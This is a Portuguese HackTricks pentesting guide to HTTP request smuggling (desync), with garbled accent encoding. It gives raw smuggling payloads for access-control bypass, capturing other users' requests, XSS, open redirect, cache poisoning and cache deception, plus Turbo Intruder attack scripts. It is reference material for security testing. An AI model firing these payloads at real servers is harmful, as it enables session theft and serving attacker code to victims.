# Contrabando de Requisi√ß√µes HTTP / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><strong>Aprenda a hackear AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que √©

Esta vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies front-end** e o servidor **back-end** permite que um **atacante** **envie** uma requisi√ß√£o HTTP que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos proxies front-end (balanceamento de carga/proxy reverso) e **como 2 requisi√ß√µes** pelo servidor **back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor back-end ap√≥s a sua**.

### Teoria

[**Especifica√ß√£o RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem √© recebida com ambos os campos de cabe√ßalho Transfer-Encoding e Content-Length, o √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de peda√ßos

### Realidade

O **Front-End** (um balanceador de carga / Proxy Reverso) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o servidor **Back-end** **processa o outro**, provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma requisi√ß√£o** ao proxy reverso que ser√° **interpretada** pelo servidor **back-end** **como 2 requisi√ß√µes diferentes**. O **perigo** desta t√©cnica reside no fato de que o servidor **back-end** **interpretar√°** a **2¬™ requisi√ß√£o injetada** como se ela **viesse do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente ser√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se que em HTTP **um caractere de nova linha √© composto por 2 bytes:**

* **Content-Length**: Este cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. Espera-se que o corpo termine no √∫ltimo caractere, **n√£o √© necess√°rio uma nova linha no final da requisi√ß√£o**.
* **Transfer-Encoding:** Este cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo peda√ßo**. O **peda√ßo** deve **terminar** com uma **nova linha**, mas esta nova linha **n√£o √© contada** pelo indicador de comprimento. Este m√©todo de transfer√™ncia deve terminar com um **peda√ßo de tamanho 0 seguido por 2 novas linhas**: `0`
* **Connection**: Baseado na minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Contrabando de Requisi√ß√µes.

## Exemplos B√°sicos

Portanto, ataques de contrabando de requisi√ß√µes envolvem colocar ambos os cabe√ßalhos `Content-Length` e `Transfer-Encoding` em uma √∫nica requisi√ß√£o HTTP e manipul√°-los de forma que os servidores front-end e back-end processem a requisi√ß√£o de maneira diferente. A maneira exata de fazer isso depende do comportamento dos dois servidores:

* **CL.TE**: o servidor front-end usa o cabe√ßalho `Content-Length` e o servidor back-end usa o cabe√ßalho `Transfer-Encoding`.
* **TE.CL**: o servidor front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor back-end usa o cabe√ßalho `Content-Length`.
* **TE.TE**: os servidores front-end e back-end ambos suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo ao ofuscar o cabe√ßalho de alguma forma.

### Vulnerabilidades CL.TE

Aqui, o servidor **front-end** usa o cabe√ßalho **`Content-Length`** e o servidor **back-end** usa o cabe√ßalho **`Transfer-Encoding`**. Podemos realizar um simples ataque de contrabando de requisi√ß√µes HTTP da seguinte forma:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Note como `Content-Length` indica que o **comprimento do corpo da requisi√ß√£o √© de 30 bytes** (_lembre-se que o HTTP usa como nova linha, ent√£o 2 bytes cada nova linha_), ent√£o o proxy reverso **enviar√° a requisi√ß√£o completa** para o back-end, e o back-end processar√° o cabe√ßalho `Transfer-Encoding` deixando o `GET /404 HTTP/1.1` como o **in√≠cio da pr√≥xima requisi√ß√£o** (a prop√≥sito, a pr√≥xima requisi√ß√£o ser√° anexada a `Foo:x<In√≠cio da pr√≥xima requisi√ß√£o aqui>`).

### Vulnerabilidades TE.CL

Aqui, o servidor front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor back-end usa o cabe√ßalho `Content-Length`. Podemos realizar um simples ataque de contrabando de requisi√ß√µes HTTP da seguinte forma:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Neste caso, o **proxy reverso** **enviar√° a requisi√ß√£o inteira** para o **back-end**, pois o **`Transfer-encoding`** indica isso. Mas, o **back-end** vai **processar** apenas os **`7b`** (4 bytes) como indicado no `Content-Length`. Portanto, a pr√≥xima requisi√ß√£o ser√° a que come√ßa por `GET /404 HTTP/1.1`

_Note que mesmo que o ataque deva terminar com um `0`, a requisi√ß√£o seguinte ser√° anexada como valores extras do par√¢metro **x**._\
_Tamb√©m note que o Content-Length da requisi√ß√£o embutida indicar√° o comprimento da pr√≥xima requisi√ß√£o que ser√° anexada ao par√¢metro **x**. Se for muito pequeno, apenas alguns bytes ser√£o anexados, e se for muito grande (maior que o comprimento da pr√≥xima requisi√ß√£o) um erro ser√° lan√ßado para a pr√≥xima requisi√ß√£o._

### Vulnerabilidades TE.TE

Aqui, os servidores front-end e back-end ambos suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo ao ofuscar o cabe√ßalho de alguma forma.\
Existem potencialmente infinitas maneiras de ofuscar o cabe√ßalho `Transfer-Encoding`. Por exemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[espa√ßo]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependendo do servidor (proxy reverso ou back-end) que **parar de processar** o cabe√ßalho **TE**, voc√™ encontrar√° uma vulnerabilidade **CL.TE** ou **TE.CL**.

## Encontrando Contrabando de Requisi√ß√µes HTTP

### Encontrando vulnerabilidades CL.TE usando t√©cnicas de tempo

Se uma aplica√ß√£o for vulner√°vel √† variante CL.TE do contrabando de requisi√ß√µes, ent√£o enviar uma requisi√ß√£o como a seguinte frequentemente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
J√° que o servidor front-end usa o cabe√ßalho `Content-Length`, ele encaminhar√° apenas parte desta solicita√ß√£o, omitindo o `0`. O servidor back-end usa o cabe√ßalho `Transfer-Encoding`, processa o primeiro bloco e depois espera pela chegada do pr√≥ximo bloco. Isso causar√° um atraso de tempo observ√°vel.

√Äs vezes, em vez de receber um tempo esgotado, voc√™ recebe um erro 400 de solicita√ß√£o ruim do host final, como no seguinte cen√°rio, onde um payload CL.TE √© enviado:

![](<../../.gitbook/assets/image (444).png>)

E a resposta √© um redirecionamento contendo um erro dentro do corpo, com at√© mesmo a vers√£o do haproxy usada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrando vulnerabilidades TE.CL usando t√©cnicas de tempo

Se uma aplica√ß√£o for vulner√°vel √† variante TE.CL de contrabando de solicita√ß√µes, ent√£o enviar uma solicita√ß√£o como a seguinte frequentemente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
```markdown
Uma vez que o servidor front-end utiliza o cabe√ßalho `Transfer-Encoding`, ele encaminhar√° apenas parte desta solicita√ß√£o, omitindo o `X`. O servidor back-end usa o cabe√ßalho `Content-Length`, espera mais conte√∫do no corpo da mensagem e aguarda a chegada do conte√∫do restante. Isso causar√° um atraso de tempo observ√°vel.

### Sondando vulnerabilidades de HTTP Request Smuggling

Uma vez que voc√™ descobriu que as **t√©cnicas de tempo est√£o funcionando**, voc√™ precisa **sondar** se pode **alterar as solicita√ß√µes de outros clientes**.\
A maneira mais f√°cil de fazer isso √© tentar envenenar suas pr√≥prias solicita√ß√µes, **fazer uma solicita√ß√£o para `/` retornar um 404, por exemplo**.\
Nos [Exemplos B√°sicos](./#basic-examples), j√° vimos exemplos de `CL.TE` e `TE.CL` de como envenenar a solicita√ß√£o de um cliente para pedir `/404`, provocando uma resposta 404 quando o cliente estava pedindo por qualquer outro recurso.

**Notas**

Algumas considera√ß√µes importantes devem ser mantidas em mente ao tentar confirmar vulnerabilidades de smuggling de solicita√ß√µes via interfer√™ncia com outras solicita√ß√µes:

* A solicita√ß√£o de "ataque" e a solicita√ß√£o "normal" devem ser enviadas ao servidor usando conex√µes de rede diferentes. Enviar ambas as solicita√ß√µes pela mesma conex√£o n√£o provar√° que a vulnerabilidade existe.
* A solicita√ß√£o de "ataque" e a solicita√ß√£o "normal" devem usar a mesma URL e nomes de par√¢metros, tanto quanto poss√≠vel. Isso ocorre porque muitas aplica√ß√µes modernas encaminham solicita√ß√µes front-end para diferentes servidores back-end com base na URL e nos par√¢metros. Usar a mesma URL e par√¢metros aumenta a chance de que as solicita√ß√µes sejam processadas pelo mesmo servidor back-end, o que √© essencial para o funcionamento do ataque.
* Ao testar a solicita√ß√£o "normal" para detectar qualquer interfer√™ncia da solicita√ß√£o de "ataque", voc√™ est√° em uma corrida com quaisquer outras solicita√ß√µes que a aplica√ß√£o esteja recebendo ao mesmo tempo, incluindo aquelas de outros usu√°rios. Voc√™ deve enviar a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o de "ataque". Se a aplica√ß√£o estiver ocupada, voc√™ pode precisar realizar v√°rias tentativas para confirmar a vulnerabilidade.
* Em algumas aplica√ß√µes, o servidor front-end funciona como um balanceador de carga e encaminha solicita√ß√µes para diferentes sistemas back-end de acordo com algum algoritmo de balanceamento de carga. Se suas solicita√ß√µes de "ataque" e "normal" forem encaminhadas para diferentes sistemas back-end, ent√£o o ataque falhar√°. Esta √© uma raz√£o adicional pela qual voc√™ pode precisar tentar v√°rias vezes antes que uma vulnerabilidade possa ser confirmada.
* Se o seu ataque for bem-sucedido em interferir com uma solicita√ß√£o subsequente, mas essa n√£o foi a solicita√ß√£o "normal" que voc√™ enviou para detectar a interfer√™ncia, isso significa que outro usu√°rio da aplica√ß√£o foi afetado pelo seu ataque. Se voc√™ continuar realizando o teste, isso poder√° ter um efeito perturbador sobre outros usu√°rios, e voc√™ deve ter cautela.

### For√ßando via cabe√ßalhos hop-by-hop

Abusando de cabe√ßalhos hop-by-hop, voc√™ pode indicar ao proxy para **deletar o cabe√ßalho Content-Length ou Transfer-Encoding para que um HTTP request smuggling seja poss√≠vel de abusar**.
```
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop**, visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando do HTTP Request Smuggling

### Para burlar controles de seguran√ßa front-end

√Äs vezes, **proxies front-end realizam algumas verifica√ß√µes de seguran√ßa**. Voc√™ pode evit√°-las abusando do HTTP Request Smuggling, pois ser√° capaz de **burlar as prote√ß√µes**. Por exemplo, neste exemplo voc√™ **n√£o pode acessar `/admin` de fora** e o proxy front-end est√° verificando isso, mas esse **proxy n√£o est√° verificando a requisi√ß√£o embutida**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando reescrita de requisi√ß√µes front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Em muitas aplica√ß√µes, o **servidor front-end realiza alguma reescrita de requisi√ß√µes** antes de encaminh√°-las ao servidor back-end, tipicamente adicionando alguns cabe√ßalhos de requisi√ß√£o adicionais.\
Uma pr√°tica comum √© **adicionar ao pedido o cabe√ßalho** `X-Forwarded-For: <IP do cliente>` ou algum cabe√ßalho similar para que o back-end conhe√ßa o IP do cliente.\
√Äs vezes, se voc√™ **descobrir quais novos valores s√£o anexados** √† requisi√ß√£o, voc√™ poder√° **burlar prote√ß√µes** e **acessar informa√ß√µes/endpoints ocultos**.

Para descobrir como o proxy est√° reescrevendo a requisi√ß√£o, voc√™ precisa **encontrar um par√¢metro POST que o back-end refletir√° seu valor** na resposta. Ent√£o, use este par√¢metro como o √∫ltimo e use um exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Neste caso, a pr√≥xima requisi√ß√£o ser√° anexada ap√≥s `search=`, que √© tamb√©m **o par√¢metro cujo valor ser√° refletido** na resposta, portanto, vai **refletir os cabe√ßalhos da pr√≥xima requisi√ß√£o**.

Note que **apenas o comprimento indicado no cabe√ßalho `Content-Length` da requisi√ß√£o embutida ser√° refletido**. Se voc√™ usar um n√∫mero baixo, apenas alguns bytes ser√£o refletidos; se usar um n√∫mero maior que o comprimento de todos os cabe√ßalhos, ent√£o a requisi√ß√£o embutida gerar√° um erro. Ent√£o, voc√™ deve **come√ßar** com um **n√∫mero pequeno** e **aumentar** at√© ver tudo o que desejava ver.\
Note tamb√©m que esta **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL** mas a requisi√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

Finalmente, note que neste ataque ainda estamos nos atacando para aprender como o proxy front-end est√° reescrevendo a requisi√ß√£o.

### Capturando requisi√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Se voc√™ encontrar uma requisi√ß√£o POST que vai salvar o conte√∫do de um dos par√¢metros, voc√™ pode anexar a seguinte requisi√ß√£o como o valor desse par√¢metro para armazenar a requisi√ß√£o do pr√≥ximo cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Neste caso, o valor do **par√¢metro comment** ser√° **salvo dentro de um coment√°rio** de um post na p√°gina que √© **publicamente acess√≠vel**, ent√£o um **coment√°rio aparecer√° com o conte√∫do da pr√≥xima requisi√ß√£o**.

_Uma limita√ß√£o com esta t√©cnica √© que ela geralmente s√≥ captura dados at√© o delimitador de par√¢metros que √© aplic√°vel para a requisi√ß√£o contrabandeada. Para submiss√µes de formul√°rios codificados por URL, ser√° o caractere `&`, o que significa que o conte√∫do armazenado da requisi√ß√£o do usu√°rio v√≠tima terminar√° no primeiro `&`, que pode at√© aparecer na string de consulta._

Note tamb√©m que esta **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL** mas a requisi√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

### Usando HTTP Request Smuggling para explorar XSS refletido

Se a p√°gina web tamb√©m for **vulner√°vel a XSS Refletido**, voc√™ pode abusar do HTTP Request Smuggling para atacar clientes da web. A explora√ß√£o de XSS Refletido a partir do HTTP Request Smuggling tem algumas vantagens:

* **N√£o requer intera√ß√£o com usu√°rios v√≠timas**
* Pode ser usado para **explorar** comportamentos XSS em partes da requisi√ß√£o que **n√£o podem ser trivialmente controladas em um ataque normal de XSS refletido**, como cabe√ßalhos de requisi√ß√µes HTTP.

Se um site for vulner√°vel a XSS Refletido no cabe√ßalho User-Agent, voc√™ pode usar este payload para explor√°-lo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usando HTTP Request Smuggling para transformar um redirecionamento interno em um redirecionamento aberto <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muitas aplica√ß√µes realizam redirecionamentos internos de uma URL para outra e colocam o nome do host do cabe√ßalho `Host` da requisi√ß√£o na URL de redirecionamento. Um exemplo disso √© o comportamento padr√£o dos servidores web Apache e IIS, onde uma requisi√ß√£o para uma pasta sem uma barra final recebe um redirecionamento para a mesma pasta incluindo a barra final:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Esse comportamento √© normalmente considerado inofensivo, mas pode ser explorado em um ataque de contrabando de requisi√ß√µes para redirecionar outros usu√°rios para um dom√≠nio externo. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

A requisi√ß√£o contrabandeada acionar√° um redirecionamento para o site do atacante, o que afetar√° a pr√≥xima requisi√ß√£o do usu√°rio processada pelo servidor back-end. Por exemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aqui, a requisi√ß√£o do usu√°rio era para um arquivo JavaScript que foi importado por uma p√°gina no site. O atacante pode comprometer totalmente o usu√°rio v√≠tima retornando seu pr√≥prio JavaScript na resposta.

### Usando HTTP Request Smuggling para realizar envenenamento de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Se alguma parte da **infraestrutura front-end realiza cache de conte√∫do** (geralmente por raz√µes de desempenho), ent√£o **pode ser poss√≠vel envenenar esse cache modificando a resposta do servidor**.

J√° vimos como modificar o valor esperado de retorno do servidor para um 404 (nos [Exemplos B√°sicos](./#basic-examples)), de maneira similar voc√™ poderia fazer o servidor retornar o conte√∫do de /index.html quando a requisi√ß√£o envenenada est√° pedindo por `/static/include.js`. Dessa forma, o conte√∫do de `/static/include.js` ser√° armazenado em cache com o conte√∫do de `/index.html`, tornando `/static/include.js` inacess√≠vel para os clientes (DoS?).

Observe que isso √© ainda mais interessante se voc√™ encontrar algum **Redirecionamento Aberto** ou algum **redirecionamento interno para redirecionamento aberto** (√∫ltima se√ß√£o). Porque, voc√™ poderia ser capaz de **mudar os valores de cache** de `/static/include.js` com **os de um script controlado por voc√™** (fazendo um **XSS geral para todos os clientes** que tentarem baixar a nova vers√£o de `/static/include.js`).

Neste exemplo, ser√° mostrado como voc√™ pode explorar um **envenenamento de cache + redirecionamento interno para redirecionamento aberto** para modificar os conte√∫dos do cache de `/static/include.js` para **servir c√≥digo JS controlado** pelo atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Note como a requisi√ß√£o embutida est√° pedindo por `/post/next?postId=3` Esta requisi√ß√£o ser√° redirecionada para `/post?postId=4` e **usar√° o valor do cabe√ßalho Host** para indicar o dom√≠nio. Portanto, voc√™ pode **modificar o cabe√ßalho Host** para apontar para o servidor do atacante e o redirecionamento usar√° esse dom√≠nio (**redirecionamento interno para redirecionamento aberto**).

Ent√£o, **ap√≥s envenenar o socket**, voc√™ precisa enviar uma **requisi√ß√£o GET** para **`/static/include.js`** esta requisi√ß√£o ser√° **envenenada** pela requisi√ß√£o de **redirecionamento interno para redirecionamento aberto** e **pegar√° o conte√∫do do script controlado pelo atacante**.

Na pr√≥xima vez que algu√©m pedir por `/static/include.js`, os conte√∫dos em cache do script do atacante ser√£o servidos (XSS geral).

### Usando HTTP Request Smuggling para realizar decep√ß√£o de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache web e decep√ß√£o de cache web?**
>
> * No **envenenamento de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do malicioso no cache, e este conte√∫do √© servido do cache para outros usu√°rios da aplica√ß√£o.
> * Na **decep√ß√£o de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera este conte√∫do do cache.

Nesta variante, o atacante contrabandeia uma requisi√ß√£o que retorna algum conte√∫do sens√≠vel espec√≠fico do usu√°rio. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Se o **envenenamento atingir um cliente que estava acessando algum conte√∫do est√°tico** como `/someimage.png` que iria ser **armazenado em cache**. Os conte√∫dos de `/private/messages` da v√≠tima ser√£o armazenados em cache em `/someimage.png` e o atacante poder√° roub√°-los.\
Note que o **atacante n√£o sabe qual conte√∫do est√°tico a v√≠tima estava tentando acessar** ent√£o provavelmente a melhor maneira de testar isso √© realizar o ataque, esperar alguns segundos e **carregar todo** o conte√∫do est√°tico e **procurar pelos dados privados**.

### Armando HTTP Request Smuggling com Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de HTTP Request Smuggling e n√£o sabe como explor√°-la. Tente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Mais informa√ß√µes

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagem daqui.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas no contrabando de requisi√ß√µes.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
